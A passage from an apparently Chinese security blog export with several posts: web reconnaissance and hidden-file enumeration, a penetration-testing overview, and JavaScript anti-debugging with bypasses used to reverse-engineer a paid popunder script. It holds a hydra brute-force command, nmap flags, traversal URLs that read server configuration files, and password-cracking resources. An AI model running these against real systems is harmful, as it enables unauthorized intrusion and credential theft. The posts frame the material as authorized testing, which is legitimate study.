2.有些不同内容的命名方案使用数字和日期作为标识符,通过他们可以轻易推测出隐藏的内容.静态页面经常采用这种命名方式. 例如PKAV.NET 的团队博客中,文章里所展示的图片的文件名没有被重新定义,采用了日期加数字递增的命名方案,如2012年12月12号发布的文章中的图片分别为1.jpg,2.jpg,3.jpg.那么这些图片的路径就是/2012-12-12/1.jpg, /2012-12-12/2.jpg, /2012-12-12/3.jpg , 此时我们在博客上发布了一篇内容加密的文章,只有团队成员才知道密码,但是黑客们根据博客以往发布文章的命名规则推测出了这些图片的准确地址,从而通过图片内容泄漏了文章的大致概念. 3.检查所有客户端代码,如HTML及JS代码,寻找任何隐藏了服务器端的线索,以及隐藏的表单元素等.认证检查注释内容,往往能带给我们惊喜,如部分通用程序会在网站首页放置一个通向网站管理后台的链接,但网站管理人员不希望这个链接被正常访问者所得知,于是将内容注释,我们可以通过查看HTML代码得知此具体地址,还有大多数的管理后台中所调用的JS 中常常会存储着后台所有功能模块的链接地址,但在判断了当前用户权限后将其隐藏起来,我们也可以通过直接查看JS代码的方式得知具体的内容,还有一些开发者会在注释内容中记录一些敏感信息,我多次从注释信息中得到数据库的名称,甚至可以得到数据库的具体连接信息,SQL 查询语句等. 4.把我们通过推测枚举出来的内容放在其他地方进行尝试。 如文件a.php 在/111/这个目录下存在,那么我们可以尝试在/222/这个目录下尝试是否存在相同文件,把所有枚举出来的文件名使用一些常规后缀来尝试访问,如index.php 这个文件已知存在,我们可以使用txt,bak,src,inc,tmp 等后缀进行尝试,如尝试index.txt,index.bak 或者添加在原有后缀基础上,index.php.bak 等.这样可以帮助我们获取这些文件的未编译版本,开发版本或者备份文件,还可以通过网站使用的语言来推测,如java 使用的.cs 后缀等. 5.搜索开发者使用的开发工具或者文本编辑器创建的临时文件。如SVN的.svn/entries,又或者Ultraedit这类文本编辑器的自动备份功能创建的.bak文件,被大量使用的.tmp后缀,以及index.php~1 这样的遗留文件,这些都是可能会发现重要线索的细节,测试中一定不要遗漏这些步骤. 6.将上述的步骤自动化,提取所有存在的文件名以及目录,后缀的词干信息,在所有目录下进行自动化批量探测. 7.如果通过以上步骤已经确定一种统一的命名方案,那么就可以使用此命名规则在整个站点下进行测试. 8.不断重复以上步骤,获取更多的关键信息,根据时间及个人想象力尽情发挥! (5) 利用公共信息,如搜索引擎,站点快照信息,以及其网站所使用的程序开发商公布的一些使用文档等信息近一步获取目标站点更多信息. 1.使用几种不同的搜索引擎和网站快照来获取目标站点的索引和历史内容记录.2.使用搞基搜索技巧如: 12345site:www.hao123.com (返回此目标站点被搜索引擎抓取收录的所有内容) site:www.hao123.com 关键词 (返回此目标站点被搜索引擎抓取收录的包含此关键词的所有页面.此处我们可以将关键词设定为,网站后台,管理后台,密码修改,密码找回等.) site:www.hao123.com inurl:admin.php (返回目标站点的地址中包含admin.php的所有页面,可以使用admin.php,manage.php或者其他关键词来寻找关键功能页面) link:www.hao123.com (返回所有包含目标站点链接的页面,其中包括其开发人员的个人博客,开发日志,或者开放这个站点的第三方公司,合作伙伴等) related:www.hao123.com (返回所有与目标站点”相似”的页面,可能会包含一些通用程序的信息等.) 3.在搜索时不要只使用网页的搜索功能,可以尝试如图片,新闻等功能来定位具体信息.4.从搜索引擎的快照中寻找一些关键信息,如程序报错信息可以会泄漏网站具体路径,或者一些快照中会保存一些测试用的测试信息,比如说某个网站在开发了后台功能模块的时候,还没给所有页面增加权限鉴别,此时被搜索引擎抓取了快照,即使后来网站增加了权限鉴别,但搜索引擎的快照中仍会保留这些信息.5通过搜索引擎获取目标站点的子域名,得到更多的功能,如有些网站经常使用admin 这个子域名作为其管理后台,如admin.hao123.com等. (6) 收集网站开发者信息,如网站的开发人员,管理维护人员等在互联网上的一些信息. 1.列出网站中得到的所有开发及维护人员的姓名和邮件地址及其他联系方式,其中包含从网站联系功能中获取到的,从HTML或JS中的注释信息中得到的,已经内容页面上获取到的。 2.使用上面介绍的一些高级搜索技巧,查找这些人在互联网上发布的与目标站点有关的一切信息,分析并发现有用的信息,如我曾经在用这个方法获取某国内大型网站的开发人员的信息时,竟发现他把他开发过的所有功能页面的源代码都放在一个公开的网站中,可以随意下载,包含了这个网站的数据库链接信息等关键内容,从而导致我轻松获取到这个大型网站的权限。","tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://yoursite.com/tags/渗透测试/"}]},{"title":"渗透测试综述","date":"2017-11-15T05:52:34.000Z","path":"2017/11/15/渗透测试综述/","text":"零、前言 渗透测试在未得到被测试方授权之前依据某些地区法律规定是违法行为。 这里我们提供的所有渗透测试方法均为（假设为）合法的评估服务，也就是通常所说的道德黑客行为（Ethical hacking），因此我们这里的所有读者应当都是Ethical Hackers，如果您还不是，那么我希望您到过这里后会成为他们中的一员 ；）这里，我还想对大家说一些话：渗透测试重在实践，您需要一颗永不言败的心和一个有着活跃思维的大脑。不是说您将这一份文档COPY到您网站上或者保存到本地电脑您就会了，即使您将它打印出来沾点辣椒酱吃了也不行，您一定要根据文档一步一步练习才行。而且测试重在用脑，千万别拿上一两个本文中提到的工具一阵乱搞，我敢保证：互联网的安全不为因为这样而更安全。祝您好运。。。 一、简介 什么叫渗透测试？渗透测试最简单直接的解释就是：完全站在攻击者角度对目标系统进行的安全性测试过程。 进行渗透测试的目的？了解当前系统的安全性、了解攻击者可能利用的途径。它能够让管理人员非常直观的了解当前系统所面临的问题。为什么说叫直观呢？就像Mitnick书里面提到的那样，安全管理（在这里我们改一下，改成安全评估工作）需要做到面面俱到才算成功，而一位黑客（渗透测试）只要能通过一点进入系统进行破坏，他就算是很成功的了。 渗透测试是否等同于风险评估？不是，你可以暂时理解成渗透测试属于风险评估的一部分。事实上，风险评估远比渗透测试复杂的多，它除渗透测试外还要加上资产识别，风险分析，除此之外，也还包括了人工审查以及后期的优化部分（可选）。 已经进行了安全审查，还需要渗透测试吗？如果我对您说：嘿，中国的现有太空理论技术通过计算机演算已经能够证明中国完全有能力实现宇航员太空漫步了，没必要再发射神8了。您能接受吗？ 渗透测试是否就是黑盒测试？否，很多技术人员对这个问题都存在这个错误的理解。渗透测试不只是要模拟外部黑客的入侵，同时，防止内部人员的有意识（无意识）攻击也是很有必要的。这时，安全测试人员可以被告之包括代码片段来内的有关于系统的一些信息。这时，它就满足灰盒甚至白盒测试。 渗透测试涉及哪些内容?技术层面主要包括网络设备，主机，数据库，应用系统。另外可以考虑加入社会工程学（入侵的艺术/THE ART OF INTRUSION）。 渗透测试有哪些不足之处？主要是投入高，风险高。而且必须是专业的Ethical Hackers才能相信输出的最终结果。 你说的那么好，为什么渗透测试工作在中国开展的不是很火热呢？我只能说：会的，一定会的。渗透测试的关键在于没法证明你的测试结果就是完善的。用户不知道花了钱证明了系统有问题以后，自己的安全等级到了一个什么程序。但是很显然，用户是相信一个专业且经验丰富的安全团队的，这个在中国问题比较严重。在我接触了一些大型的安全公司进行的一些渗透测试过程来看，测试人员的水平是对不住开的那些价格的，而且从测试过程到结果报表上来看也是不负责的。我估计在三年以后，这种情况会有所改观，到时一方面安全人员的技术力量有很大程度的改观，另一方面各企业对渗透测试会有一个比较深刻的理解，也会将其做为一种IT审计的方式加入到开发流程中去。渗透测试的专业化、商业化会越来越成熟。 二、制定实施方案 实施方案应当由测试方与客户之间进行沟通协商。一开始测试方提供一份简单的问卷调查了解客户对测试的基本接收情况。内容包括但不限于如下： 目标系统介绍、重点保护对象及特性。 是否允许数据破坏？ 是否允许阻断业务正常运行？ 测试之前是否应当知会相关部门接口人？ 接入方式？外网和内网？ 测试是发现问题就算成功，还是尽可能的发现多的问题？ 渗透过程是否需要考虑社会工程？ 。。。 在得到客户反馈后，由测试方书写实施方案初稿并提交给客户，由客户进行审核。在审核完成后，客户应当对测试方进行书面委托授权。这里，两部分文档分别应当包含如下内容： 实施方案部分：... 书面委托授权部分：... 三、具体操作过程 1、信息收集过程 网络信息收集: ​ 在这一部还不会直接对被测目标进行扫描，应当先从网络上搜索一些相关信息，包括Google Hacking， Whois查询， DNS等信息（如果考虑进行社会工程学的话，这里还可以相应从邮件列表/新闻组中获取目标系统中一些边缘信息如内部员工帐号组成，身份识别方式，邮件联系地址等）。 ​ 涉及的工具包括：Google,Demon,webhosting.info,Apollo,Athena,GHDB.XML,netcraft,seologs 除此之外，我想特别提醒一下使用Googlebot/2.1绕过一些文件的获取限制。 Google hacking 中常用的一些语法描述1.搜索指定站点关键字site。你可以搜索具体的站点如site:www.nosec.org。使用site:nosec.org可以搜索该域名下的所有子域名的页面。甚至可以使用site:org.cn来搜索中国政府部门的网站。2.搜索在URL网址中的关键字inurl。比如你想搜索带参数的站点，你可以尝试用inurl:asp?id=3.搜索在网页标题中的关键字intitle。如果你想搜索一些登陆后台，你可以尝试使用intitle:&quot;admin login&quot; 目标系统信息收集:通过上面一步，我们应当可以简单的描绘出目标系统的网络结构，如公司网络所在区域，子公司IP地址分布，VPN接入地址等。这里特别要注意一些比较偏门的HOST名称地址，如一些backup开头或者temp开关的域名很可能就是一台备份服务器，其安全性很可能做的不够。从获取的地址列表中进行系统判断，了解其组织架构及操作系统使用情况。最常用的方法的是目标所有IP网段扫描。 端口/服务信息收集: ​ 这一部分已经可以开始直接的扫描操作，涉及的工具包括： nmap , thc-amap ​ 1.我最常使用的参数nmap -sS -p1-10000 -n -P0 -oX filename.xml --open -T5 应用信息收集：httprint，SIPSCAN，smap 这里有必要将SNMP拿出来单独说一下，因为目前许多运营商、大型企业内部网络的维护台通过SNMP进行数据传输，大部分情况是使用了默认口令的，撑死改了private口令。这样，攻击者可以通过它收集到很多有效信息。snmp-gui，HiliSoft MIB Browser，mibsearch，net-snmp都是一些很好的资源。 2、漏洞扫描 这一步主要针对具体系统目标进行。如通过第一步的信息收集，已经得到了目标系统的IP地址分布及对应的域名，并且我们已经通过一些分析过滤出少许的几个攻击目标，这时，我们就可以针对它们进行有针对性的漏洞扫描。这里有几个方面可以进行： 针对系统层面的工具有：ISS, Nessus, SSS, Retina, 天镜, 极光 针对WEB应用层面的工具有：AppScan, Acunetix Web Vulnerability Scanner, WebInspect, Nstalker 针对数据库的工具有：ShadowDatabaseScanner, NGSSQuirreL 针对VOIP方面的工具有：PROTOS c07 sip(在测试中直接用这个工具轰等于找死)以及c07 h225, Sivus, sipsak等。 事实上，每个渗透测试团队或多或少都会有自己的测试工具包，在漏洞扫描这一块针对具体应用的工具也比较个性化。 3、漏洞利用 有时候，通过服务/应用扫描后，我们可以跳过漏洞扫描部分，直接到漏洞利用。因为很多情况下我们根据目标服务/应用的版本就可以到一些安全网站上获取针对该目标系统的漏洞利用代码，如milw0rm, securityfocus,packetstormsecurity等网站，上面都对应有搜索模块。实在没有，我们也可以尝试在GOOGLE上搜索“应用名称 exploit”、“应用名称 vulnerability”等关键字。 当然，大部分情况下你都可以不这么麻烦，网络中有一些工具可供我们使用，最著名的当属metasploit了，它是一个开源免费的漏洞利用攻击平台。其他的多说无益，您就看它从榜上无名到冲进前五（top 100)这一点来说，也能大概了解到它的威力了。除此之外，如果您（您们公司）有足够的moeny用于购买商用软件的话，CORE IMPACT是相当值得考虑的，虽然说价格很高，但是它却是被业界公认在渗透测试方面的泰山北斗，基本上测试全自动。如果您觉得还是接受不了，那么您可以去购买CANVAS，据说有不少0DAY，不过它跟metasploit一样，是需要手动进行测试的。最后还有一个需要提及一下的Exploitation_Framework，它相当于一个漏洞利用代码管理工具，方便进行不同语言，不同平台的利用代码收集，把它也放在这里是因为它本身也维护了一个exploit库，大家参考着也能使用。 上面提到的是针对系统进行的，在针对WEB方面，注入工具有NBSI, OWASP SQLiX, SQL Power Injector, sqlDumper, sqlninja, sqlmap, Sqlbftools, priamos, ISR-sqlget***等等。 在针对数据库方面的工具有： 数据库 工具列表 Oracle（1521端口）: 目前主要存在以下方面的安全问题： 1、TNS监听程序攻击（sid信息泄露,停止服务等） 2、默认账号( default password list ) 3、SQL INJECTION（这个与传统的意思还不太一样） 4、缓冲区溢出，现在比较少了。 thc-orakel, tnscmd ,oscanner,Getsids,TNSLSNR, lsnrcheck, OAT, Checkpwd, orabf MS Sql Server（1433、1434端口） Mysql（3306端口） DB2（523、50000、50001、50002、50003端口） db2utils Informix（1526、1528端口） 在针对Web服务器方面的工具有： WEB服务器 工具列表IIS IISPUTSCANNER Tomcat 想起/admin和/manager管理目录了吗？另外，目录列表也是Tomcat服务器中最常见的问题。比如5.*版本中的http://127.0.0.1/;index.jsp http://www.example.com/foo/&quot;../manager/html http://www.example.com:8080/examples/servlets/servlet/CookieExample?cookiename=HAHA&amp;cookievalue=%5C%22FOO%3B+Expires%3DThu%2C+1+Jan+2009+00%3A00%3A01+UTC%3B+Path%3D%2F%3B http://www.example.com:8080/servlets-examples/servlet/CookieExample?cookiename=BLOCKER&amp;cookievalue=%5C%22A%3D%27%3B+Expires%3DThu%2C+1+Jan+2009+00%3A00%3A01+UTC%3B+Path%3D%2Fservlets-examples%2Fservlet+%3B JBOSS jboss的漏洞很少，老版本中8083端口有%符号的漏洞： GET %. HTTP/1.0可以获取物理路径信息， GET %server.policy HTTP/1.0可以获取安全策略配置文档。 你也可以直接访问GET %org/xxx/lib.class来获取编译好的java程序，再使用一些反编译工具还原源代码。 Apache Resin http://victim/C:%5C/ http://victim/resin-doc/viewfile/?file=index.jsp http://victim/resin-doc/viewfile/?contextpath=/otherwebapp&amp;servletpath=&amp;file=WEB-INF/web.xml http://victim/resin-doc/viewfile/?contextpath=/&amp;servletpath=&amp;file=WEB-INF/classes/com/webapp/app/target.class http://victim/[path]/[device].[extension] http://victim/%20..&quot;web-inf http://victim/%20 http://victim/[path]/%20.xtp WebLogic Web安全测试主要围绕几块进行： Information Gathering：也就是一般的信息泄漏，包括异常情况下的路径泄漏、文件归档查找等 Business logic testing：业务逻辑处理攻击，很多情况下用于进行业务绕过或者欺骗等等 Authentication Testing：有无验证码、有无次数限制等，总之就是看能不能暴力破解或者说容不容易通过认证，比较直接的就是“默认口令”或者弱口令了 Session Management Testing：会话管理攻击在COOKIE携带认证信息时最有效 Data Validation Testing：数据验证最好理解了，就是SQL Injection和Cross Site Script等等 目前网上能够找到许多能够用于进行Web测试的工具，根据不同的功能分主要有： 枚举（Enumeration）： DirBuster, http-dir-enum, wget 基于代理测试类工具：paros, webscarab, Burp Suite 针对WebService测试的部分有一些尚不是很成熟的工具，如：wsbang，wschess，wsmap，wsdigger，wsfuzzer 这一部分值得一提的是，很多渗透测试团队都有着自己的测试工具甚至是0DAY代码，最常见的是SQL注入工具，现网开发的注入工具（如NBSI等）目前都是针对中小企业或者是个人站点/数据库进行的，针对大型目标系统使用的一些相对比较偏门的数据库系统（如INFORMIX，DB2）等，基本上还不涉及或者说还不够深入。这时各渗透测试团队就开发了满足自身使用习惯的测试工具。 在针对无线环境的攻击有：WifiZoo 4、权限提升 在前面的一些工作中，你或许已经得到了一些控制权限，但是对于进一步攻击来说却还是不够。例如：你可能很容易的能够获取Oracle数据库的访问权限，或者是得到了UNIX(AIX,HP-UX,SUNOS)的一个基本账号权限，但是当你想进行进一步的渗透测试的时候问题就来了。你发现你没有足够的权限打开一些密码存储文件、你没有办法安装一个SNIFFER、你甚至没有权限执行一些很基本的命令。这时候你自然而然的就会想到权限提升这个途径了。 目前一些企业对于补丁管理是存在很大一部分问题的，他们可能压根就没有想过对一些服务器或者应用进行补丁更新，或者是延时更新。这时候就是渗透测试人员的好机会了。经验之谈：有一般权限的Oracle账号或者AIX账号基本上等于root，因为这就是现实生活。 5、密码破解 有时候，目标系统任何方面的配置都是无懈可击的，但是并不是说就完全没办法进入。最简单的说，一个缺少密码完全策略的论证系统就等于你安装了一个不能关闭的防盗门。很多情况下，一些安全技术研究人员对此不屑一顾，但是无数次的安全事故结果证明，往往破坏力最大的攻击起源于最小的弱点，例如弱口令、目录列表、SQL注入绕过论证等等。所以说，对于一些专门的安全技术研究人员来说，这一块意义不大，但是对于一个ethical hacker来说，这一步骤是有必要而且绝大部分情况下是必须的。；） 目前比较好的网络密码暴力破解工具有：thc-hydra，brutus >hydra.exe -L users.txt -P passwords.txt -o test.txt -s 2121 www.heimian.com ftp 目前网络中有一种资源被利用的很广泛，那就是rainbow table技术，说白了也就是一个HASH对应表，有一些网站提供了该种服务，对外宣称存储空间大于多少G，像rainbowcrack更是对外宣称其数据量已经大于1.3T。针对此种方式对外提供在线服务的有： 网址 描述rainbowcrack里面对应了多种加密算法的HASH。 http://gdataonline.com/seekhash.php http://www.milw0rm.com/cracker/info.php http://www.hashchecker.com/?_sls=search_hash http://bokehman.com/cracker/ http://passcracking.ru/ http://www.md5.org.cn http://www.cmd5.com/ 数据量全球第一，如果本站无法破解，那么你只能去拜春哥... 当然，有些单机破解软件还是必不可少的：Ophcrack，rainbowcrack（国人开发，赞一个），cain，L0phtCrack（破解Windows密码），John the Ripper（破解UNIX/LINUX）密码，当然，还少不了一个FindPass... 针对网络设备的一些默认帐号，你可以查询http://www.routerpasswords.com/和http://www.phenoelit-us.org/dpl/dpl.html 在渗透测试过程中，一旦有机会接触一些OFFICE文档，且被加了密的话，那么，rixler是您马上要去的地方，他们提供的OFFICE密码套件能在瞬间打开OFFICE文档（2007中我没有试过，大家有机会测试的话请给我发一份测试结果说明，谢谢）。看来微软有理由来个补丁什么的了。对于企业来说，您可以考虑使用铁卷或者RMS了。 ６、日志清除 It is not necessary actually. 7、进一步渗透 攻入了DMZ区一般情况下我们也不会获取多少用价值的信息。为了进一步巩固战果，我们需要进行进一步的内网渗透。到这一步就真的算是无所不用其及。最常用且最有效的方式就是Sniff抓包（可以加上ARP欺骗）。当然，最简单的你可以翻翻已入侵机器上的一些文件，很可能就包含了你需要的一些连接帐号。比如说你入侵了一台Web服务器，那么绝大部分情况下你可以在页面的代码或者某个配置文件中找到连接数据库的帐号。你也可以打开一些日志文件看一看。 除此之外，你可以直接回到第二步漏洞扫描来进行。 四、生成报告 报告中应当包含： 薄弱点列表清单（按照严重等级排序） 薄弱点详细描述（利用方法） 解决方法建议 参与人员/测试时间/内网/外网 五、测试过程中的风险及规避 在测试过程中无可避免的可能会发生很多可预见和不可预见的风险，测试方必须提供规避措施以免对系统造成重大的影响。以下一些可供参考： \\1. 不执行任何可能引起业务中断的攻击（包括资源耗竭型DoS，畸形报文攻击，数据破坏）。 \\2. 测试验证时间放在业务量最小的时间进行。 \\3. 测试执行前确保相关数据进行备份。 \\4. 所有测试在执行前和维护人员进行沟通确认。 \\5. 在测试过程中出现异常情况时立即停止测试并及时恢复系统。 \\6. 对原始业务系统进行一个完全的镜像环境，在镜像环境上进行渗透测试。 参考资料: 大成天下渗透测试服务技术白皮书 v1.4 Penetration Testing Framework Report Template http://www.phenoelit.de/dpl/dpl.html http://snakeoillabs.com/downloads/GHDB.xml http://www.eccouncil.org/Course-Outline/Ethical%20Hacking%20and%20Countermeasures%20Course.htm http://www.owasp.org/index.php/OWASP_Testing_Project http://www.red-database-security.com http://www.petefinnigan.com http://www.insomniasec.com/releases/whitepapers-presentations http://www.isecom.org/osstmm/","tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://yoursite.com/tags/渗透测试/"}]},{"title":"JavaScript反混淆与混淆","date":"2017-11-13T16:10:18.000Z","path":"2017/11/14/JavaScript反混淆与混淆/","text":"本文摘抄于岚光的博客https://0x0d.im/archives/javascript-anti-debug-and-obfuscator.html 前些时候因为人机识别和反作弊业务的需求调研了浏览器指纹和追踪的一些方法，那么当我们把检测代码上线后，怎么保护它，不被攻击者迅速分析破解呢？ 常见的编码（如 Base62）、压缩（如 UglifyJS）、复杂化表达式（如填充无用代码，拆分字符串）就不细说了。至于将 JavaScript 代码隐藏在图片中类似隐写术的方法，一般是恶意程序为了逃避杀毒软件检测所用，正常业务很少用到。 通常用各种编码“加密”的代码，无论怎样变形，其最终都要调用一次 eval 等函数执行。只需劫持关键函数调用的行为，改为文本输出（如 console.log）即可得到载体中隐藏的代码。 12345eval = function() &#123; console.log('eval', JSON.stringify(arguments));&#125;;eval('console.log(\"Hello world!\")'); 去除空格、换行，缩短函数、变量名之类的压缩代码可以直接用浏览器的开发者工具格式化，或是使用 jsbeautifier 等在线工具美化。复杂化表达式会增加代码复杂度，极大地降低可读性，但有经验和耐心的研究者依然能慢慢调试还原出功能来。 (下面代码在 Chrome 59 上测试通过） Console检测到浏览器 Console 打开（Detect all browser console open or not）时阻塞 Javascript 执行： 1234567891011121314var checkStatus;var element = new Image();// var element = document.createElement('any');element.__defineGetter__('id', function() &#123; checkStatus = 'on';&#125;);setInterval(function() &#123; checkStatus = 'off'; console.log(element); console.clear(); if(checkStatus = 'on') &#123; alert('Prohibit the use of console!'); &#125;&#125;, 1000) DebuggerConsole 调试时会自动停在断点处，借此可以插入随机的 debugger 干扰正常调试。 12345678910111213!function test() &#123; // 捕获异常，递归次数过多调试工具会抛出异常。 try&#123; !function cir(i) &#123; // 当打开调试工具后，抛出异常，setTimeout执行test无参数，此时i == NaN，(\"\" + i / i).length == 3 // debugger设置断点 ( 1 !== ( \"\" + i / i).length || 0===i ) &amp;&amp; function(&#123;&#125;.constructor(\"debugger\")(),cir(++i); &#125; (0) &#125; catch(e) &#123; setTimeout(test,500) &#125;&#125;() demo：https://jsfiddle.net/ftpgxm/t4ux8xp4/2/ 当然，为了能够调试，我们可以使用Tampermonkey，在执行js代码之前，先执行下列代码 12window._setTimeout = window.setTimeout;window.setTimeout = function () &#123;&#125;; 具体可参考： http://www.jianshu.com/p/9148d215c119 https://zhuanlan.zhihu.com/p/29214928 AST通过修改 AST(Abstract Syntax Tree) 生成一个新的 AST，混淆规则有拆分字符串、拆分数组，增加废代码等。如在同构语法的基础上提取出所有 key 值到闭包的参数中，破坏代码的可读性： 12var a = document.getElementById('a');a.innerHTML = 'test'; 混淆之后是： 1234(function(a,b,c,d,e,f)&#123; var g=a[b][c](d); g[e]=f&#125;)(window,'document', 'getElementById', 'a', 'innerHTML', 'test'); WebAssemblyWebAssembly 是可用于浏览器的字节码格式，比 JS 更高效，能从 C/C++ 编译。如一个简单的 add 和 square： 12345678910111213WebAssembly.compile(new Uint8Array(` 00 61 73 6d 01 00 00 00 01 0c 02 60 02 7f 7f 01 7f 60 01 7f 01 7f 03 03 02 00 01 07 10 02 03 61 64 64 00 00 06 73 71 75 61 72 65 00 01 0a 13 02 08 00 20 00 20 01 6a 0f 0b 08 00 20 00 20 00 6c 0f 0b`.trim().split(/[\\s\\r\\n]+/g).map(str =&gt; parseInt(str, 16)))).then(module =&gt; &#123; const instance = new WebAssembly.Instance(module) const &#123; add, square &#125; = instance.exports console.log('2 + 4 =', add(2, 4)) console.log('3^2 =', square(3)) console.log('(2 + 5)^2 =', square(add(2 + 5)))&#125;) 它可能是终极的解决办法，因为作为二进制编码它自带“混淆”，还可以进一步加壳或虚拟机保护。 绕过方法对于大部分的 JS 代码混淆加密，其实都可以用 Partial evaluation 解决（参见讨论：https://www.v2ex.com/t/367641）。如 Google 的 Closure Compiler 和 FaceBook 的 Prepack，虽然是用于 JS 代码优化的工具，但它们都会在编译期重构 AST、计算函数、初始化对象等，最终还原出正常的可读的代码。 对于干扰 Console 调试的方法，可以用 Fiddler 或 Burp Suite 抓包，拦截页面请求，删除或注释掉干扰代码。 参考 使用 estools 辅助反混淆 Javascript 移动时代的前端加密 可信前端之路-代码保护 混淆恶意JavaScript代码的检测与反混淆方法研究 怎样理解 Partial Evaluation WebAssembly 实践：如何写代码","tags":[{"name":"javascript","slug":"javascript","permalink":"http://yoursite.com/tags/javascript/"}]},{"title":"javascript的调试","date":"2017-11-13T09:36:16.000Z","path":"2017/11/13/javascript的调试/","text":"javascript作为一种普适性的脚本语言，广泛应用于网页端、移动端。而本文将要讲述的是javascript的调试。 调试工具javascript内置命令调试javascript作为一种脚本语言，内置了大量的输出函数。这里主要讲述的是alert/prompt/confirm、console.log、document.write。 其实上面的&quot;、&quot;已经为我们分好类的。 弹框式输出 console命令框输出 网页内输出 弹框式输出 优点：可以作为IO中断 缺点：由于是中断操作，频繁的确定会比较麻烦。弹框中所能容纳的字符数有限 console命令框输出 优点：输出内容无限制 缺点：不能产生中断，较长的代码调试起来相对而言较麻烦 网页内输出 优点：由于是在网页内部输出，所以内容样式可以自定义。输出内容也没有限制 缺点：不能产生中断，较长的代码调试起来相对而言较麻烦 辅助工具 由于输出的内容多样化，很多时候我们需要的字符串类型，这时候不妨使用toString函数，以此来方便查看输出结果！ Visual Studio Codevsc是最近我所使用的文本编辑器，以前一直使用sublime作为文本编辑的工具。visual studio code是一款轻量级的IDE，可进行多种脚本语言的调试与编写！而且vsc支持windows、mac、linux，是一款不可多得的调试软件。具体操作步骤就不再赘述，因为与vs基本一致！ 优点：支持多种脚本语言的编译调试 缺点：由于visual studio code使用nodejs作为底层调试器，所以不支持弹框式输出以及I网页内输出等方式。这也就意味着，很多在浏览器中能够实现的编写方式在这里很有可能编译不通 Chrome开发者模式(推荐)chrome的开发者模式中，sources选项栏中支持了调试。其右上角给出了调试工具、断点信息、监听器信息等等，总而言之功能十分强大。 优点：chrome开发者模式进行调试，能够解决大部分js静态分析问题，功能齐全，支持几乎全部的js命令 缺点：现如今有许多网页在做开发的时候，进行了反调试功能。这个时候，chrome的开发者模式进行调试可能效果不明显。但是我们可以配合Tampermonkey 进行脚本设置，封闭/变相禁用反调试功能。 范例： 1234(function() &#123; window._setTimeout = window.setTimeout; window.setTimeout = function () &#123;&#125;;&#125;)(); 由于在执行网页中的js代码之前，先调用了上述代码。所以setTimeout函数都给更改了，这就导致了反调试的重要一环被截断，这会在后面的章节进行讲述。 综合范例可以说这儿的范例是从网上摘抄的，所以大家擦亮的自己的眼睛，防止被误导。 缘起最近在研究 PopUnder 的实现方案，通过 Google 搜索 js popunder 出来的第一页中有个网站 popunderjs.com，当时看了下，这是个提供 popunder 解决方案的一家公司，而且再翻了几页，发现市面上能解决这个问题的，只有2家公司，可见这个市场基本是属于垄断型的。popunderjs 原来在 github 上是有开源代码的，但后来估计作者发现这个需求巨大的商业价值，索性不开源了，直接收费。所以现在要研究它的实现方案，只能上官网扒它源码了。 这是它的示例页：http://code.ptcong.com/demos/bjp/demo.html分别加载了几个重要文件： 12http://code.ptcong.com/demos/bjp/script.js?0.3687041198903791http://code.ptcong.com/demos/bjp/license.demo.js?0.31109710863616447 文件结构script.js 是功能主体，实现了 popunder 的所有功能以及定义了多个 API 方法license.demo.js 是授权文件，有这个文件你才能顺利调用 script.js 里的方法 防止被逆向这么具有商业价值的代码，就这么公开地给你们用，肯定要考虑好被逆向的问题。我们来看看它是怎么反逆向的。首先，打开控制台，发现2个问题： 控制台所有内容都被反复清空，只输出了这么一句话：Console was cleared script.js?0.5309098417125133:1 无法断点调试，因为一旦启用断点调试功能，就会被定向到一个匿名函数 (function() {debugger}) 也就是说，常用的断点调试方法已经无法使用了，我们只能看看源代码，看能不能理解它的逻辑了。但是，它源代码是这样的： 123456789101112131415161718var a = typeof window === S[0] &amp;&amp; typeof window[S[1]] !== S[2] ? window : global;try &#123; a[S[3]](S[4]); return function() &#123;&#125; ;&#125; catch (a) &#123; try &#123; (function() &#123;&#125; [S[11]](S[12])()); return function() &#123;&#125; ; &#125; catch (a) &#123; if (/TypeError/[S[15]](a + S[16])) &#123; return function() &#123;&#125; ; &#125; &#125;&#125; 可见源代码是根本不可能阅读的，所以还是得想办法破掉它的反逆向措施。 利用工具巧妙破解反逆向首先在断点调试模式一步步查看它都执行了哪些操作，突然就发现了这么一段代码： 1234567891011121314151617181920(function() &#123; (function a() &#123; try &#123; (function b(i) &#123; if (('' + (i / i)).length !== 1 || i % 20 === 0) &#123; (function() &#123;&#125; ).constructor('debugger')(); &#125; else &#123; debugger ; &#125; b(++i); &#125; )(0); &#125; catch (e) &#123; setTimeout(a, 5000); &#125; &#125; )()&#125;)(); 这段代码主要有2部分，一是通过 try {} 块内的 b() 函数来判断是否打开了控制台，如果是的话就进行自我调用，反复进入 debugger 这个断点，从而达到干扰我们调试的目的。如果没有打开控制台，那调用 debugger 就会抛出异常，这时就在 catch {} 块内设置定时器，5秒后再调用一下 b() 函数。 这么说来其实一切的一切都始于 setTimeout 这个函数（因为 b() 函数全是闭包调用，无法从外界破掉），所以只要在 setTimeout 被调用的时候，不让它执行就可以破解掉这个死循环了。 所以我们只需要简单地覆盖掉 setTimeout 就可以了……比如： 1234(function() &#123; window._setTimeout = window.setTimeout; window.setTimeout = function () &#123;&#125;;&#125;)(); 但是！这个操作无法在控制台里面做！因为当你打开控制台的时候，你就必然会被吸入到 b() 函数的死循环中。这时再来覆盖 setTimeout 已经没有意义了。 这时我们的工具 TamperMonkey 就上场了，把代码写到 TM 的脚本里，就算不打开控制台也能执行了。 TM 脚本写好之后，刷新页面，等它完全加载完，再打开控制台，这时 debugger 已经不会再出现了！接下来就轮到控制台刷新代码了 通过 Console was cleared 右侧的链接点进去定位到具体的代码，点击 {} 美化一下被压缩过的代码，发现其实就是用 setInterval 反复调用 console.clear() 清空控制台并输出了 &lt;div&gt;Console was cleared&lt;/div&gt; 信息，但是注意了，不能直接覆盖 setInterval 因为这个函数在其他地方也有重要的用途。 所以我们可以通过覆盖 console.clear() 函数和过滤 log 信息来阻止它的清屏行为。 同样写入到 TamperMonkey 的脚本中，代码： 12345678window.console.clear = function() &#123;&#125;;window.console._log = window.console.log;window.console.log = function (e) &#123; if (e[&apos;nodeName&apos;] &amp;&amp; e[&apos;nodeName&apos;] == &apos;DIV&apos;) &#123; return ; &#125; return window.console.error.apply(window.console._log, arguments);&#125;; 之所以用 error 来输出信息，是为了查看它的调用栈，对理解程序逻辑有帮助。 基本上，做完这些的工作之后，这段代码就可以跟普通程序一样正常调试了。但还有个问题，它主要代码是经常混淆加密的，所以调试起来很有难度。下面简单讲讲过程。 混淆加密方法一：隐藏方法调用，降低可读性从 